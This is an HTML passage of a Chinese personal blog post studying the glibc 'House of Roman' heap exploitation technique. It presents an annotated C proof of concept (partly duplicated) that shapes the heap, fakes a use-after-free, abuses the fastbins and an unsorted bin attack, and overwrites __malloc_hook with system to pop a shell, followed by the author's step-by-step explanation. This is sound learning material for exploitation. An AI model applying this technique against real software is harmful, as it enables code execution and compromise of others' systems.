class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line">   <span class="comment">// 我们需要填充器，因为下面的覆写需要在fd槽中有一个指针才能工作。</span></span><br><span class="line">   <span class="comment">// 释放此块会将一个块放入&#x27;fastbin_victim&#x27;的fd槽中，以便稍后使用。</span></span><br><span class="line">   <span class="built_in">free</span>(relative_offset_heap);	</span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   在该块上创建UAF。回想一下，fastbin_victim指向的块当前位于偏移0x190（relative_offset_heap）。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="built_in">free</span>(fastbin_victim);</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   现在，我们开始进行相对覆写，因为我们已经将指针放置在了正确的位置。了解此布局非常重要。</span></span><br><span class="line"><span class="comment">   当前的堆布局：</span></span><br><span class="line"><span class="comment">   0x0：fastbin_victim - 大小为0x70</span></span><br><span class="line"><span class="comment">   0x70：alignment_filler - 大小为0x90</span></span><br><span class="line"><span class="comment">   0x100：fake_libc_chunk - 大小为0x70</span></span><br><span class="line"><span class="comment">   0x170：leftover_main - 大小为0x20</span></span><br><span class="line"><span class="comment">   0x190：relative_offset_heap - 大小为0x70</span></span><br><span class="line"><span class="comment">   bin布局：</span></span><br><span class="line"><span class="comment">         fastbin：fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">         unsorted：leftover_main</span></span><br><span class="line"><span class="comment">   现在，相对覆写开始：</span></span><br><span class="line"><span class="comment">   回想一下，fastbin_victim指向relative_offset_heap（位于0x100-0x200偏移范围内）。fastbin使用单链表，下一个块在&#x27;fd&#x27;槽中。</span></span><br><span class="line"><span class="comment">   通过*部分地*编辑fastbin_victim的最后一个字节（从0x90到0x00），我们已将fastbin_victim的fd指针移动到fake_libc_chunk（位于偏移0x100）。</span></span><br><span class="line"><span class="comment">   还要注意，fake_libc_chunk之前已经在unsorted_bin中。因此，它具有指向main_arena + 0x68的fd指针。</span></span><br><span class="line"><span class="comment">   现在，fastbin如下所示：</span></span><br><span class="line"><span class="comment">   fastbin_victim -&gt; fake_libc_chunk -&gt;（main_arena + 0x68）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   下面逐步演示相对覆写（如上所述）。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">覆写堆块的第一个字节，以将fastbin块指向具有LibC地址的块\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">fastbin 0x70现在如下所示：\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">   fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// 位置在0x100处。但是，我们只想覆盖第一个字节。因此，我们将其设置为0x0以进行模拟UAF</span></span><br><span class="line">   <span class="comment">// 原本fastbin_victim指向偏移0x190 的relative_offset_heap，因此只需修改一个字节为0x00就能指向fake_libc_chunk了</span></span><br><span class="line">   <span class="comment">// 这些操作都是为了获得一个分配在libc中的fastbin而服务的</span></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   现在，我们有一个fastbin，如下所示：</span></span><br><span class="line"><span class="comment">      0x70：fastbin_victim -&gt; fake_libc_chunk -&gt;（main_arena + 0x68）</span></span><br><span class="line"><span class="comment">   我们希望fake_libc_chunk中的fd指针指向有用的位置。因此，让我们将其编辑为指向__malloc_hook的位置。这样，我们就可以控制一个函数指针。</span></span><br><span class="line"><span class="comment">   为此，我们需要一个有效的malloc大小。在__memalign_hook中通常是一个以0x7f开头的地址。因为__memalign_hook值紧接在这之前都是0，我们可以使用一个未对齐的块将其作为有效大小在0x70的fastbin中工作。</span></span><br><span class="line"><span class="comment">   这就是前面4位随机数的作用。LibC地址的前12位对于地址是确定性的。但是，接下来的4位（总共2个字节）不是。</span></span><br><span class="line"><span class="comment">   因此，我们必须暴力破解16个不同的可能性（16）才能将其放置在正确的位置。这个“位置”对于每个GLibC版本都是不同的（应该注意）。</span></span><br><span class="line"><span class="comment">在进行了这个相对覆写之后，fastbin如下所示：</span></span><br><span class="line"><span class="comment">      0x70：fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23)。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   相对覆写main_arena指针，使其接近__malloc_hook，以创建一个指向__malloc_hook的伪fastbin块。</span></span><br><span class="line"><span class="comment">   ///// 注意：为了使此攻击一致（不使用硬编码的偏移量进行暴力破解），我们手动设置了这些值。 \\\</span></span><br><span class="line"><span class="comment">在实际攻击中，这些值需要特定于版本，并且某些位必须进行暴力破解（取决于位数）。</span></span><br><span class="line"><span class="comment">   */</span> </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">在fastbin中使用相对覆写将main_arena指针指向附近的位置，以创建一个伪fastbin块\n&quot;</span>);</span><br><span class="line">   <span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// 我们从malloc中减去0x23，因为我们想使用0x7f作为有效的fastbin块大小。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 相对覆写</span></span><br><span class="line">   <span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">   <span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">   fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// 地址的最低有效字节。</span></span><br><span class="line">   fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// 最高的4位必须在真正的攻击中进行暴力破解。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 在fastbin中的__malloc_hook块之前有两个填充块。</span></span><br><span class="line">   <span class="comment">// 这些是fastbin_victim和fake_libc_chunk。</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;获取指向__malloc_hook附近的伪块\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">在真正的攻击中，这将在15/16次中失败\n\</span></span><br><span class="line"><span class="string">因为malloc_hook的最后半字节是随机的\n&quot;</span>);	</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 如果4位暴力破解不起作用，这将导致崩溃，因为块的大小与块的bin不匹配。</span></span><br><span class="line">   <span class="comment">// 否则，攻击的下一步可以开始。</span></span><br><span class="line">   <span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;通过第1步 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   第2部分：未排序的bin攻击</span></span><br><span class="line"><span class="comment">   现在，我们控制了__malloc_hook的位置。但是，我们仍然不知道LibC的地址。因此，我们无法对此攻击做太多事情。为了弹出shell，我们需要在__malloc_hook的位置获取一个地址。</span></span><br><span class="line"><span class="comment">   我们将使用未排序的bin攻击，将__malloc_hook的值更改为main_arena + 0x68。有关未排序的bin攻击的更多信息，请参阅https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">简要概述一下，未排序的bin攻击允许我们通过更改unsorted_bin块的chunk-&gt;bk来将main_arena + 0x68的值写入任何位置。我们将选择将其写入__malloc_hook的位置。</span></span><br><span class="line"><span class="comment">在我们使用未排序的bin攻击将__malloc_hook覆写为main_arena之后，我们将使用相对覆写（再次）来将指针更改为one_gadget，以实现立即代码执行。</span></span><br><span class="line"><span class="comment">再次强调，这种相对覆写效果很好，但需要额外的1字节（8位）的暴力破解。</span></span><br><span class="line"><span class="comment">这将使成功尝试的机会增加到12位的随机性。这大约有1/4096或0.0244%的成功概率。</span></span><br><span class="line"><span class="comment">第二阶段攻击的步骤将在下面的说明中解释。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">开始第2步：未排序的bin攻击\n\n\</span></span><br><span class="line"><span class="string">未排序的bin攻击使我们能够将大值写入到任何位置。但是，我们无法控制该值。该值始终为main_arena + 0x68。\n\</span></span><br><span class="line"><span class="string">我们将将未排序的bin攻击指向__malloc_hook，以进行稍后的相对覆写。\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 获取要破坏的块。添加另一个指针以防止释放时合并。</span></span><br><span class="line">   </span><br><span class="line">   <span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 不想合并</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;将块放入unsorted_bin中\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 释放该块以创建UAF</span></span><br><span class="line">   <span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line">   <span class="comment">/* /// 注意：byte2的最后4位在之前已经进行了暴力破解。然而，为了举例，这是动态计算的。 \\\</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   __malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// 这减去0x10是因为chunk-&gt;fd在未排序的bin攻击中实际进行了覆写。</span></span><br><span class="line">   byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">   byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 使用另一个相对偏移来覆写chunk-&gt;bk指针的ptr。</span></span><br><span class="line">   <span class="comment">// 根据之前的暴力破解（来自4位），我们知道此位置的位置。它距离__malloc_hook有5个字节的距离。</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;覆写块的最后两个字节，以指向__malloc_hook\n&quot;</span>);</span><br><span class="line">   unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// bk的第0字节。</span></span><br><span class="line">   <span class="comment">// //// 注意：通常，第二个字节的后半部分必须进行暴力破解。然而，为了举例，我们设置了这个值以使攻击保持一致。///</span></span><br><span class="line">   unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// bk的第1字节。其中的第二个4位必须在之前的攻击中进行暴力破解。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   // 在fastbin中__malloc_hook块之前的两个填充块。</span></span><br><span class="line"><span class="comment">   // 这些是fastbin_victim和fake_libc_chunk。</span></span><br><span class="line"><span class="comment">   puts(&quot;获取指向__malloc_hook附近的伪造块\n&quot;);</span></span><br><span class="line"><span class="comment">   puts(&quot;\</span></span><br><span class="line"><span class="comment">在实际攻击中，这将在15/16次中失败\n\</span></span><br><span class="line"><span class="comment">因为__malloc_hook的最后半字节是随机的\n&quot;);	</span></span><br><span class="line"><span class="comment">   malloc(0x60);</span></span><br><span class="line"><span class="comment">   malloc(0x60);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   // 如果4位暴力破解失败，这将导致崩溃，因为块的大小与块的bin不匹配。</span></span><br><span class="line"><span class="comment">   // 否则，攻击的下一步可以开始了。</span></span><br><span class="line"><span class="comment">   uint8_t* malloc_hook_chunk = malloc(0x60);	</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   puts(&quot;通过第1步 =)\n\n\n&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   /*</span></span><br><span class="line"><span class="comment">   第2部分：未排序的bin攻击</span></span><br><span class="line"><span class="comment">   现在，我们控制了__malloc_hook的位置。</span></span><br><span class="line"><span class="comment">   然而，我们仍然不知道LibC的地址。所以，我们不能对这个攻击做太多事情。</span></span><br><span class="line"><span class="comment">   为了弹出一个shell，我们需要在__malloc_hook的位置得到一个地址。</span></span><br><span class="line"><span class="comment">   我们将使用未排序的bin攻击，将__malloc_hook的值更改为main_arena + 0x68。</span></span><br><span class="line"><span class="comment">   有关未排序的bin攻击的更多信息，请参阅https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c。</span></span><br><span class="line"><span class="comment">   简要概述一下，未排序的bin攻击允许我们通过更改unsorted_bin块的chunk-&gt;bk将main_arena + 0x68的值写入任何位置。</span></span><br><span class="line"><span class="comment">   我们将选择将其写入__malloc_hook的位置。</span></span><br><span class="line"><span class="comment">   在我们使用未排序的bin攻击将__malloc_hook覆写为main_arena之后，我们将使用相对覆写（再次）来将指针更改为one_gadget，以实现立即代码执行。</span></span><br><span class="line"><span class="comment">   再次强调，这种相对覆写效果很好，但需要额外的1字节（8位）的暴力破解。</span></span><br><span class="line"><span class="comment">   这将使成功尝试的机会增加到12位的随机性。这大约有1/4096或0.0244%的成功概率。</span></span><br><span class="line"><span class="comment">   下面的说明将解释第二阶段攻击的步骤。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">开始第2步：未排序的bin攻击\n\n\</span></span><br><span class="line"><span class="string">未排序的bin攻击使我们能够将大值写入到任何位置。但是，我们无法控制该值。该值始终为main_arena + 0x68。\n\</span></span><br><span class="line"><span class="string">我们将将未排序的bin攻击指向__malloc_hook，以进行稍后的相对覆写。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 获取要破坏的块。添加另一个指针以防止释放时合并。</span></span><br><span class="line">   <span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 不想合并</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;将块放入未排序的bin中\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 释放块以创建UAF</span></span><br><span class="line">   <span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line">   <span class="comment">/* /// 注意：byte2的最后4位在之前已经进行了暴力破解。然而，为了举例，这是动态计算的。 \\\*/</span></span><br><span class="line">   __malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// 这减去0x10是因为chunk-&gt;fd在未排序的bin攻击中实际进行了覆写。</span></span><br><span class="line">   byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">   byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">   <span class="comment">// 使用另一个相对偏移来覆写chunk-&gt;bk指针的ptr。</span></span><br><span class="line">   <span class="comment">// 根据之前的暴力破解（来自4位），我们知道此位置的位置。它距离__malloc_hook有5个字节的距离。</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;覆写块的最后两个字节，以指向__malloc_hook\n&quot;</span>);</span><br><span class="line">   unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// bk的第0字节。 	</span></span><br><span class="line">   <span class="comment">// //// 注意：通常，第二个字节的后半部分必须进行暴力破解。然而，为了举例，我们设置了这个值以使攻击保持一致。///</span></span><br><span class="line">   unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// bk的第1字节。其中的第二个4位必须在之前的攻击中进行暴力破解。</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   触发未排序的bin攻击。</span></span><br><span class="line"><span class="comment">   这将把(main_arena + 0x68)的值写入到bk ptr + 0x10中。</span></span><br><span class="line"><span class="comment">   然而，会发生一些事情：</span></span><br><span class="line"><span class="comment">      - 这使得未排序的bin（因此，small和large也是如此）不可用。因此，现在只能使用之前在fastbin中分配的分配。</span></span><br><span class="line"><span class="comment">      - 如果未分配相同大小的块（未排序的bin攻击块），程序将立即崩溃。</span></span><br><span class="line"><span class="comment">        因此，分配请求必须与未排序的bin块的大小相同。</span></span><br><span class="line"><span class="comment">   第一点在这个攻击中是完全可以接受的。但是，在更复杂的编程中，这可能是一个问题。</span></span><br><span class="line"><span class="comment">   第二个只需要我们做与当前块相同大小的分配。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;触发未排序的bin攻击\n&quot;</span>);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// 触发未排序的bin攻击，将__malloc_hook覆写为main_arena + 0x68</span></span><br><span class="line">   <span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)dlsym(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;通过第2步 =)\n\n\n&quot;</span>);</span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   第3步：将__malloc_hook设置为system</span></span><br><span class="line"><span class="comment">   该块本身距离__malloc_hook有19个字节的距离。</span></span><br><span class="line"><span class="comment">   因此，我们使用相对覆写（再次）来部分覆写main_arena指针（来自未排序的bin攻击）以指向system。</span></span><br><span class="line"><span class="comment">   在实际攻击中，前12位是静态的（每个版本都是如此）。</span></span><br><span class="line"><span class="comment">   但是，在此之后，下一个12位必须进行暴力破解。</span></span><br><span class="line"><span class="comment">   /// 注意：为了举例，我们将设置这些值，而不是进行暴力破解。 \\\ */</span> </span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;第3步：将__malloc_hook设置为system/one_gadget\n\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">现在，我们在__malloc_hook中有一个指向LibC的指针（来自第2步）\n\</span></span><br><span class="line"><span class="string">我们可以使用相对覆写将其指向system或one_gadget。\n\</span></span><br><span class="line"><span class="string">注意：在实际攻击中，这将是最后8位的暴力破解的位置。\n&quot;</span>);</span><br><span class="line">   malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// 前12位是静态的（每个版本都是如此）。</span></span><br><span class="line"></span><br><span class="line">   malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// 这的最后4位必须进行暴力破解（之前已经完成）。</span></span><br><span class="line">   malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// 最后一个字节是剩下的8位，必须进行暴力破解。</span></span><br><span class="line">   malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// 如果数据和文本段之间的间隙非常大，这也是必需的。只是为了安全起见。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 触发malloc调用以通过从__malloc_hook运行的system调用执行代码。</span></span><br><span class="line">   <span class="comment">// 在实际示例中，您可能希望使用one_gadget。</span></span><br><span class="line">   <span class="comment">// 但是，为了保持可移植性，我们将只使用system并将/bin/sh作为参数添加到指针中。</span></span><br><span class="line">   <span class="comment">// 虽然这有点作弊（二进制文件是PIE），如果二进制文件不是PIE，那么在.bss节中有一个指针将可以工作而无需泄漏。</span></span><br><span class="line">   <span class="comment">// 要获取system地址（之前为了一致性），二进制文件必须是PIE。因此，地址放在这里。</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;弹出Shell！&quot;</span>);</span><br><span class="line">   <span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>完整看完之后感觉按这个poc的流程不是非常实用（需要大量的堆风水，pwn手都是人肉内存分配器是吧）。实战可能会好一些。<br>思路本质比较好理解，整个poc个人感觉最抽象的部分是第一步的堆风水。复杂的这些堆排布最终实现的目的是只通过malloc和free获得一个malloc_hook附近的堆块。  </p>
+</blockquote>
+<p>在堆非常干净的情况下，作者是这么操作的，可以借助这个例子了解一下堆风水：</p>
+<ul>
+<li>拿一个0x60的fastbin chunk 1（实际大小0x70)</li>
+<li>分配一个不用的chunk，大小0x80，实际大小0x90，此时相对堆基址的偏移来到了0x100，这灵性的一步是为了待会我们改一个字节就能修改指针指向的chunk</li>
+<li>分配一个0x80的chunk 2，等会放入unsorted bin</li>
+<li>分配一个0x60的fastbin chunk 3，该chunk的偏移地址来到了0x190</li>
+<li>释放chunk2，放入unsorted bin，此时其fd和bk存有main_arena+0x68</li>
+<li>取0x60大小的chunk4（fake_libc_chunk），会从chunk2中进行分割，带有main_arena地址</li>
+<li>读取取出的chunk4，泄露main_arena地址然后计算偏移获取malloc_hook</li>
+<li>释放chunk3，放入fastbin</li>
+<li>释放chunk1，接入fastbin链表头，其fd指向chunk3（0x190）</li>
+<li>模拟一个UAF，写chunk1的fd一字节0x00将其fd指向0x100的chunk2（chunk 4）</li>
+<li>写chunk4，修改低位地址令其fd指向目标地址</li>
+<li>最后将fastbin中的chunk1和3取出，再次取就取到了malloc_hook-0x23处的chunk<br>参考代码中如下注释：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当前的堆布局：</span></span><br><span class="line"><span class="comment">0x0：fastbin_victim - 大小为0x70</span></span><br><span class="line"><span class="comment">0x70：alignment_filler - 大小为0x90</span></span><br><span class="line"><span class="comment">0x100：fake_libc_chunk - 大小为0x70</span></span><br><span class="line"><span class="comment">0x170：leftover_main - 大小为0x20</span></span><br><span class="line"><span class="comment">0x190：relative_offset_heap - 大小为0x70</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bin布局：</span></span><br><span class="line"><span class="comment">      fastbin：fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">      unsorted：leftover_main</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+这个例子后面部分不再多解释，这个poc前面的堆风水操作是冲着“尽可能少的爆破字节”进行设计的，针对我们没有任何地址泄露的情况使用。</li>
+</ul>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/" title="分享会">
+                    <div class="prevTitle">分享会</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.</span> <span class="toc-text">House of Roman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升tips</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
